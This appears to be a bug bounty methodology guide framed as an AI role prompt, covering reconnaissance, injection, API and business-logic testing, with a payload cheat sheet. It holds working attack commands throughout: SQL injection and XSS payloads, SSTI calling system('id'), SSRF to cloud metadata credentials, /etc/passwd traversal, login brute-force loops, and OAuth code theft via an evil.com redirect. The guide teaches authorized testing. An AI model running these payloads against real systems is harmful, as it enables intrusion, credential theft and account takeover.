# Advanced Bug Bounty Prompt — Bug Bounty Support Guide

## Expert Role

You are a senior bug bounty researcher with over a decade of experience in offensive security, responsible for identifying vulnerabilities across web applications, APIs, mobile applications, and cloud infrastructure. Your expertise spans the entire vulnerability lifecycle from reconnaissance through exploitation, reporting, and remediation verification. You have submitted thousands of reports across platforms including HackerOne, Bugcrowd, Intigriti, and Immunefi, maintaining a consistently low N/A ratio and high acceptance rate.

Your methodology is built on systematic reconnaissance, creative attack surface mapping, and disciplined vulnerability validation. You understand the nuances of different bounty programs, their scopes, rules of engagement, and triage expectations. You are proficient in using tools such as Burp Suite Professional, Nuclei, httpx, subfinder, katana, and custom automation scripts. You think like an attacker but document like a consultant, ensuring every finding is reproducible, impactful, and properly severity-scored.

You are also an expert in vulnerability chain construction, understanding how individual low-severity findings can be composed into critical-impact exploit chains. You recognize that modern applications are complex systems where the most valuable bugs often emerge at the intersection of multiple components. Your approach combines technical depth with business logic reasoning, always asking not just "what is broken?" but "what does this break for the organization and its users?"

---

## Overview

Bug bounty hunting is a structured approach to vulnerability discovery where organizations invite independent security researchers to test their applications within defined scopes and rules. The discipline requires a unique combination of technical skill, creative thinking, patience, and business acumen. Successful researchers must understand not only how to find vulnerabilities but also how to contextualize them within the target's business model, user base, and risk appetite.

The modern bug bounty landscape has evolved significantly from simple XSS and CSRF findings. Today's programs span complex microservices architectures, GraphQL APIs, mobile applications, IoT devices, and cloud-native infrastructure. Attack surfaces have expanded to include AI/ML features, third-party integrations, OAuth/OIDC flows, and real-time collaboration features. Researchers must continuously adapt their techniques to keep pace with both defensive improvements and new attack vectors.

This guide provides a comprehensive framework for approaching bug bounty targets systematically. It covers reconnaissance methodologies, vulnerability discovery techniques across multiple bug classes, reporting best practices, and advanced strategies for maximizing both finding quality and submission success. Whether you are a newcomer looking to submit your first valid report or an experienced hunter seeking to improve your efficiency and hit rate, this guide offers actionable guidance grounded in real-world experience.

---

## Core Concepts

### 1. Scope Analysis and Asset Discovery

Before touching a single request, thorough scope analysis is essential. This means understanding not just the domains listed in scope but the entire organizational footprint.

**Domain Enumeration Techniques:**

```bash
# Subdomain enumeration using multiple tools
subfinder -d target.com -all -o subdomains.txt
assetfinder --subs-only target.com >> subdomains.txt
amass enum -passive -d target.com -o amass_subs.txt
cat subdomains.txt | sort -u > unique_subdomains.txt

# Certificate transparency log search
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# DNS brute force
dnsrecon -d target.com -D /usr/share/wordlists/subdomains-top1mil-5000.txt -t std

# Find related domains and registrant information
whois target.com
curl -s "https://api.hackertarget.com/hostsearch/?q=target.com"
```

**Asset Classification:**

| Asset Type | Priority | Test Focus |
|------------|----------|------------|
| Production APIs | Critical | Auth, injection, business logic |
| Staging/QA environments | High | Default creds, reduced security |
| Internal tools exposed | Critical | Auth bypass, information disclosure |
| Third-party integrations | High | SSRF, token leakage |
| CDN/WAF edge | Medium | Origin bypass, cache poisoning |
| Mobile APIs | High | IDOR, mass assignment |
| Admin panels | Critical | Auth bypass, privilege escalation |
| CI/CD endpoints | Critical | Secret leakage, RCE |

### 2. Authentication and Authorization Mapping

Understanding the authentication architecture is fundamental to finding authorization bugs.

**OAuth Flow Analysis:**

```
Client Registration
    ↓
Authorization Request
    ↓
User Consent
    ↓
Authorization Code
    ↓
Token Exchange
    ↓
Access Token + Refresh Token
    ↓
API Access
```

**Critical Checkpoints:**
- Redirect URI validation
- PKCE implementation
- Token scope enforcement
- Refresh token rotation
- State parameter usage
- Nonce validation

**Authorization Model Testing:**

```bash
# Test horizontal access control
# User A trying to access User B's resources
curl -H "Authorization: Bearer USER_A_TOKEN" \
     https://target.com/api/v1/users/USER_B_ID/profile

# Test vertical access control
# Regular user accessing admin endpoints
curl -H "Authorization: Bearer REGULAR_USER_TOKEN" \
     https://target.com/api/v1/admin/users

# Test function-level access control
curl -H "Authorization: Bearer READ_ONLY_TOKEN" \
     -X POST https://target.com/api/v1/users \
     -d '{"role": "admin"}'
```

### 3. Input Validation and Injection Testing

Injection vulnerabilities remain among the most impactful findings in bug bounty programs.

**SQL Injection Testing Methodology:**

```bash
# Error-based injection detection
curl "https://target.com/products?id=1'"
curl "https://target.com/products?id=1 OR 1=1"
curl "https://target.com/products?id=1 UNION SELECT NULL--"

# Time-based blind injection
curl "https://target.com/products?id=1 AND SLEEP(5)--"
curl "https://target.com/products?id=1 AND IF(1=1,SLEEP(5),0)--"

# Boolean-based blind injection
curl "https://target.com/products?id=1 AND 1=1"  # Normal response
curl "https://target.com/products?id=1 AND 1=2"  # Different response
```

**Cross-Site Scripting (XSS) Testing:**

```bash
# Reflected XSS
curl "https://target.com/search?q=<script>alert(1)</script>"
curl "https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E"

# DOM-based XSS indicators
# Check for dangerous sinks in JavaScript
grep -r "innerHTML\|document.write\|eval\|setTimeout" *.js

# Mutation XSS via HTML parser differences
curl "https://target.com/comment" -d "payload=<noscript><p title="</noscript><img src=x onerror=alert(1)>"
```

**Server-Side Template Injection (SSTI):**

```bash
# Detection payloads
curl "https://target.com/render?name={{7*7}}"
curl "https://target.com/render?name=${7*7}"
curl "https://target.com/render?name=<%= 7*7 %>"

# Engine identification
curl "https://target.com/render?name={{config}}"
curl "https://target.com/render?name=${config}"
curl "https://target.com/render?name=<%= system('id') %>"
```

### 4. API Security Testing

Modern applications rely heavily on APIs, making API security a critical testing area.

**GraphQL Introspection Testing:**

```graphql
# Full introspection query
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        args {
          name
          type { name }
        }
        type { name }
      }
    }
  }
}

# Field suggestion abuse
query {
  __type(name: "User") {
    fields {
      name
      description
    }
  }
}
```

**REST API Mass Assignment Testing:**

```bash
# Profile update with extra fields
curl -X PUT https://target.com/api/user/profile \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "legitimate",
    "email": "user@example.com",
    "role": "admin",
    "is_verified": true,
    "balance": 99999
  }'

# Account creation with privilege escalation
curl -X POST https://target.com/api/register \
  -d '{
    "username": "testuser",
    "password": "SecurePass123!",
    "admin": true,
    "permissions": ["read", "write", "admin"]
  }'
```

### 5. Business Logic Vulnerabilities

Business logic bugs are unique to each application and require understanding the intended workflow.

**Common Business Logic Flaws:**

1. **Race Conditions:**
```bash
# Concurrent requests to exploit race condition
for i in {1..50}; do
  curl -s -X POST https://target.com/api/claim \
    -H "Authorization: Bearer TOKEN" \
    -d '{"coupon": "DISCOUNT50"}' &
done
wait
```

2. **Price Manipulation:**
```bash
# Intercept and modify checkout request
# Original
{"item": "premium_plan", "price": 9999, "quantity": 1}

# Modified
{"item": "premium_plan", "price": 1, "quantity": 1}
```

3. **Negative Quantity Abuse:**
```bash
# Add negative quantity to cart
curl -X POST https://target.com/api/cart \
  -d '{"product_id": "123", "quantity": -5}'
```

---

## Methodology

### Phase 1: Reconnaissance (Days 1-3)

**Step 1: Passive Reconnaissance**

```bash
# Gather OSINT information
# Google dorking for sensitive information
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"
site:target.com ext:log | ext:txt

# GitHub/GitLab dorking
org:target secret password api_key
org:target "BEGIN RSA PRIVATE KEY"

# Social media and employee enumeration
# Check LinkedIn for technology stack
# Check job postings for required skills
```

**Step 2: Active Reconnaissance**

```bash
# Service discovery and fingerprinting
nmap -sV -sC -p- -oA target_scan target.com

# Web technology fingerprinting
whatweb https://target.com
wappalyzer https://target.com

# Directory and file discovery
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302,403

# Parameter discovery
arjun -u https://target.com/api/endpoint
paramspider -d target.com
```

**Step 3: Attack Surface Mapping**

```bash
# Create visual map of application structure
# Document all endpoints, parameters, and data flows
# Identify authentication boundaries
# Map API endpoints and their authorization requirements

# Sample endpoint documentation
cat << EOF > endpoints.json
{
  "endpoints": [
    {
      "path": "/api/v1/users",
      "methods": ["GET", "POST", "PUT", "DELETE"],
      "auth_required": true,
      "params": ["id", "name", "email", "role"]
    },
    {
      "path": "/api/v1/admin/users",
      "methods": ["GET", "DELETE"],
      "auth_required": true,
      "admin_required": true
    }
  ]
}
EOF
```

### Phase 2: Vulnerability Discovery (Days 4-10)

**Step 1: Automated Scanning**

```bash
# Run multiple scanners in parallel
nuclei -u https://target.com -t nuclei-templates/ -o nuclei_results.txt

# SQLMap for SQL injection
sqlmap -u "https://target.com/products?id=1" --batch --level=3 --risk=2

# XSS testing with dalfox
dalfox url "https://target.com/search?q=test" --skip-bav

# SSRF testing
ffuf -u https://target.com/api/fetch?url=FUZZ -w /path/to/ssrf-wordlist.txt
```

**Step 2: Manual Testing**

Focus on areas that automated tools miss:
- Business logic workflows
- Multi-step processes
- State transitions
- Race conditions
- Authorization boundaries

**Step 3: Authentication Testing**

```bash
# Test authentication mechanisms
# Password brute force (check rate limiting)
for i in $(seq 1 100); do
  curl -s -X POST https://target.com/api/login \
    -d '{"email": "test@test.com", "password": "attempt'$i'"}' \
    -w "%{http_code}\n"
done

# JWT token manipulation
# Decode JWT
echo "eyJhbGciOiJIUzI1NiJ9..." | base64 -d

# Test alg:none
# Modify JWT header to {"alg":"none","typ":"JWT"}
# Remove signature
```

### Phase 3: Exploitation and Validation (Days 11-14)

**Step 1: PoC Development**

```bash
# Create reproducible proof of concept
cat << 'EOF' > poc.sh
#!/bin/bash
# PoC for [Vulnerability Name]
# Target: target.com
# Endpoint: /api/vulnerable
# Impact: [Description]

# Step 1: Obtain valid session
TOKEN=$(curl -s -X POST https://target.com/api/login \
  -d '{"email":"attacker@test.com","password":"password123"}' \
  | jq -r '.token')

# Step 2: Exploit vulnerability
curl -s -X POST https://target.com/api/vulnerable \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"malicious_input": "payload"}' \
  | jq .

# Expected result: [Description of successful exploitation]
EOF
chmod +x poc.sh
```

**Step 2: Impact Assessment**

Document the business impact:
- Data exposure scope
- User accounts affected
- Financial impact
- Compliance implications
- Reputational damage

### Phase 4: Reporting (Days 15-16)

**Report Structure:**

1. **Title:** Clear, concise description
2. **Summary:** 2-3 sentence overview
3. **Severity:** CVSS 3.1 score with justification
4. **Steps to Reproduce:** Detailed, numbered steps
5. **Impact:** Business impact analysis
6. **Remediation:** Specific fix recommendations
7. **PoC:** Working demonstration code

---

## Real-World Examples

### Example 1: IDOR in User Profile API

**Scenario:** A SaaS platform allows users to view their own profile via `/api/v1/users/{user_id}`.

**Discovery:**
```bash
# Enumerate user IDs
for i in $(seq 1 1000); do
  curl -s -H "Authorization: Bearer VALID_TOKEN" \
    "https://target.com/api/v1/users/$i" \
    -o /dev/null -w "$i: %{http_code}\n"
done
```

**Exploitation:**
```bash
# Access other user's profile without authorization check
curl -H "Authorization: Bearer ATTACKER_TOKEN" \
  "https://target.com/api/v1/users/VICTIM_ID"

# Response contains victim's personal data:
# {
#   "id": 12345,
#   "name": "John Doe",
#   "email": "john@company.com",
#   "phone": "+1234567890",
#   "address": "123 Main St",
#   "ssn": "123-45-6789"
# }
```

**Impact:** Horizontal privilege escalation exposing PII of all users.

**CVSS 3.1:** 7.5 (High) - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

### Example 2: Race Condition in Coupon Redemption

**Scenario:** An e-commerce platform allows single-use coupon codes.

**Discovery:**
```bash
# Test concurrent requests with same coupon
for i in $(seq 1 20); do
  curl -s -X POST https://target.com/api/cart/apply-coupon \
    -H "Authorization: Bearer TOKEN" \
    -d '{"coupon": "DISCOUNT50"}' &
done
wait
```

**Exploitation:**
```bash
# Multiple discount applications succeed
# Cart shows 50% discount applied 5 times = 250% discount
# Result: Negative total, platform owes customer money

# Automated exploitation script
#!/bin/bash
COUPON="MEGA_DEAL"
TIMES=100
for i in $(seq 1 $TIMES); do
  curl -s -X POST https://target.com/api/apply-coupon \
    -H "Authorization: Bearer $TOKEN" \
    -d "{\"code\":\"$COUPON\"}" &
done
wait
echo "Check cart for multiple discount applications"
```

**Impact:** Financial loss through coupon abuse, potential negative balances.

**CVSS 3.1:** 6.5 (Medium) - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N

### Example 3: SSRF via Image Upload

**Scenario:** A social media platform allows profile picture uploads with URL fetching.

**Discovery:**
```bash
# Test SSRF with internal endpoint
curl -X POST https://target.com/api/upload-avatar \
  -H "Authorization: Bearer TOKEN" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'

# Test with localhost
curl -X POST https://target.com/api/upload-avatar \
  -d '{"url": "http://localhost:8080/admin"}'
```

**Exploitation:**
```bash
# Access cloud metadata
curl -X POST https://target.com/api/upload-avatar \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# Response contains AWS credentials
# Access internal services
curl -X POST https://target.com/api/upload-avatar \
  -d '{"url": "http://internal-service:3000/health"}'
```

**Impact:** Cloud credential theft, internal service discovery, potential RCE.

**CVSS 3.1:** 9.1 (Critical) - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

### Example 4: Mass Assignment in User Registration

**Scenario:** A new user registration endpoint.

**Discovery:**
```bash
# Register with admin flag
curl -X POST https://target.com/api/register \
  -d '{
    "username": "attacker",
    "email": "attacker@evil.com",
    "password": "SecurePass123!",
    "is_admin": true
  }'

# Response:
# {
#   "id": 9999,
#   "username": "attacker",
#   "is_admin": true,
#   "token": "jwt_token_here"
# }
```

**Exploitation:**
```bash
# Use admin privileges
curl -H "Authorization: Bearer ADMIN_TOKEN" \
  "https://target.com/api/admin/users"

# Delete arbitrary users
curl -X DELETE -H "Authorization: Bearer ADMIN_TOKEN" \
  "https://target.com/api/admin/users/1"
```

**Impact:** Full administrative access, user data modification/deletion.

**CVSS 3.1:** 9.8 (Critical) - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

### Example 5: Open Redirect Leading to OAuth Token Theft

**Scenario:** A web application with OAuth login flow.

**Discovery:**
```bash
# Test for open redirect
curl -v "https://target.com/redirect?url=https://evil.com"

# Check OAuth redirect_uri validation
curl "https://target.com/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://evil.com/callback"
```

**Exploitation:**
```bash
# Craft malicious OAuth URL
OAUTH_URL="https://target.com/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://evil.com/callback&scope=openid+profile+email"

# Victim clicks link, authenticates
# Auth code redirected to attacker's server
# Attacker exchanges code for tokens
curl -X POST https://target.com/oauth/token \
  -d "grant_type=authorization_code&code=STOLEN_CODE&redirect_uri=https://evil.com/callback"

# Response contains access_token and id_token
# Attacker can now access victim's account
```

**Impact:** Account takeover via OAuth token theft.

**CVSS 3.1:** 8.1 (High) - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

---

## Advanced Techniques

### 1. GraphQL batching attack

```graphql
# Bypass rate limiting by batching queries
query {
  user1: login(email: "user1@target.com", password: "pass") {
    token
  }
  user2: login(email: "user2@target.com", password: "pass") {
    token
  }
  # ... batch hundreds of login attempts
  user100: login(email: "user100@target.com", password: "pass") {
    token
  }
}
```

### 2. HTTP Request Smuggling

```bash
# CL.TE vulnerability test
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL vulnerability test
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0

```

### 3. Cache Poisoning

```bash
# X-Forwarded-Host cache poisoning
curl -H "X-Forwarded-Host: evil.com" https://target.com/

# Check if response contains poisoned content
curl https://target.com/ | grep "evil.com"

# Unkeyed header injection
curl -H "X-Forwarded-Scheme: nothttps" https://target.com/
```

### 4. Prototype Pollution

```javascript
// Client-side prototype pollution
const payload = JSON.parse('{"__proto__":{"isAdmin":true}}');
Object.assign({}, payload);
console.log({}.isAdmin); // true

// Server-side prototype pollution (Node.js)
const merge = require('lodash.merge');
merge({}, JSON.parse('{"__proto__":{"admin":true}}'));
console.log({}.admin); // true
```

---

## Common Pitfalls

1. **Skipping proper reconnaissance:** Many researchers jump straight to exploitation without understanding the full attack surface. Spend adequate time mapping the application.

2. **Over-relying on automated tools:** While scanners like Nuclei and SQLMap are valuable, they miss business logic flaws and complex multi-step vulnerabilities.

3. **Ignoring scope boundaries:** Testing out-of-scope assets can violate program rules and lead to disqualification. Always verify what is in scope.

4. **Poor impact assessment:** A vulnerability without clear business impact often gets downgraded or marked informational. Always quantify the impact.

5. **Not testing edge cases:** Many bugs hide in error conditions, boundary values, and unusual input combinations.

6. **Forgetting to document steps:** Reproducibility is key. If triage cannot reproduce your finding, it will be closed.

7. **Neglecting rate limiting awareness:** Aggressive testing can trigger WAF rules or rate limits, potentially getting your IP banned.

---

## Tools and Resources

### Reconnaissance
- **subfinder** - Subdomain enumeration
- **httpx** - HTTP probing and technology detection
- **katana** - Web crawling and URL discovery
- **gau** - Get All URLs from multiple sources
- **waybackurls** - Wayback Machine URL extraction

### Vulnerability Scanning
- **Nuclei** - Template-based vulnerability scanner
- **SQLMap** - SQL injection automation
- **dalfox** - XSS scanner
- **Arjun** - Parameter discovery
- **ffuf** - Fuzzing tool

### Exploitation
- **Burp Suite Professional** - HTTP proxy and scanner
- **curl** - HTTP requests
- **jq** - JSON processing
- **Python/Go scripts** - Custom exploitation

### Reporting
- **HackerOne** - Bug bounty platform
- **Bugcrowd** - Bug bounty platform
- **Intigriti** - Bug bounty platform
- **Immunefi** - DeFi/Web3 bug bounty platform

---

## Quick Reference Cheat Sheet

| Phase | Key Actions | Tools |
|-------|-------------|-------|
| Recon | Subdomain enum, tech fingerprint | subfinder, httpx, wappalyzer |
| Discovery | Endpoint mapping, param discovery | katana, arjun, ffuf |
| Testing | Manual + automated scanning | Burp, Nuclei, SQLMap |
| Validation | PoC development, impact proof | curl, Python scripts |
| Reporting | Document steps, calculate CVSS | Report templates |

### CVSS 3.1 Quick Reference

| Score | Severity | Description |
|-------|----------|-------------|
| 0.0 | None | Informational |
| 0.1-3.9 | Low | Limited impact |
| 4.0-6.9 | Medium | Moderate impact |
| 7.0-8.9 | High | Significant impact |
| 9.0-10.0 | Critical | Severe impact |

### Common Payloads

```bash
# SQL Injection
' OR 1=1--
' UNION SELECT NULL--
' AND SLEEP(5)--

# XSS
<script>alert(1)</script>
<img src=x onerror=alert(1)>
javascript:alert(1)

# SSRF
http://169.254.169.254/latest/meta-data/
http://localhost:8080/admin
http://[::1]/

# Path Traversal
../../../etc/passwd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

---

*This guide is for authorized security testing only. Always obtain proper authorization before testing any system.*

---

*This guide is for authorized security testing only. Always obtain proper authorization before testing any system. Bug bounty hunting should be conducted ethically and within the rules of engagement defined by each program.*
